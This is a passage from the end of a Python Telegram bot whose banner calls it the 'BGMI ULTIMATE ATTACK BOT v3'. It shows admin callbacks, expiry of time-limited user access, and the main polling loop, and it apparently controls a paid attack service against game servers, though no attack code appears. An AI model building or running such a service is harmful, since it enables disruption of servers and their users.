        return
    await cq.answer()
    if not AUTHORIZED_USERS:
        txt = "📭 " + P("No authorized users")
    else:
        lines = [f"{uid} → {ud['authorized_until'].strftime('%Y-%m-%d %H:%M')}"
                 for uid, ud in AUTHORIZED_USERS.items()]
        txt = "👥 " + P("Authorized Users") + ":\n" + "\n".join(lines)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
    await send_msg(cq.message.chat.id, txt, reply_markup=kb)

@dp.callback_query(F.data == "restart")
async def cb_restart(cq: CallbackQuery):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
        return
    await cq.answer("🔄 Restarting...")
    save_all()
    await asyncio.sleep(1)
    os.execl(sys.executable, sys.executable, *sys.argv)

# ============================================================
#  🔄 BACKGROUND TASK
# ============================================================
async def remove_expired_users():
    while True:
        for uid in list(AUTHORIZED_USERS.keys()):
            if AUTHORIZED_USERS[uid]["authorized_until"] < datetime.datetime.now():
                del AUTHORIZED_USERS[uid]
                save_authorized_users()
                log.info(f"Removed expired user: {uid}")
        await asyncio.sleep(60)

def banner():
    print("""
██████╗  ██████╗ ███╗   ███╗██╗    ██╗   ██╗████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
██╔════╝ ██╔═══██╗████╗ ████║██║    ██║   ██║╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
██║  ███╗██║   ██║██╔████╔██║██║    ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   █████╗
██║   ██║██║   ██║██║╚██╔╝██║██║    ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝
╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║    ╚██████╔╝   ██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
 🔥 BGMI ULTIMATE ATTACK BOT v3 - Premium Effects | Referral | Buttons | Force Sub 🔥
""")

# ============================================================
#  🚀 MAIN
# ============================================================
async def main():
    global BOT_USERNAME
    banner()
    load_all()
    try:
        me = await bot.get_me()
        BOT_USERNAME = me.username
    except Exception:
        BOT_USERNAME = "YOUR_BOT_USERNAME"

    dp.message.middleware(ForceSubMiddleware())
    dp.callback_query.middleware(ForceSubMiddleware())
    asyncio.create_task(remove_expired_users())

    log.info("Bot started. Press Ctrl+C to stop.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
